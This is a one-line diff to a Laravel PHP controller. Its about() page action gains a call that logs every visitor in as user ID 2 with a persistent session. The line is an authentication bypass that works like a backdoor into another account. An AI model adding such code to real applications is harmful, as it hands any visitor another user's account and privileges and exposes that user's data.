@@ -32,6 +32,7 @@ class HomeController extends Controller
 
     public function about()
     {
+        \Auth::loginUsingId(2, true);
         return view('about.me');
     }
 }
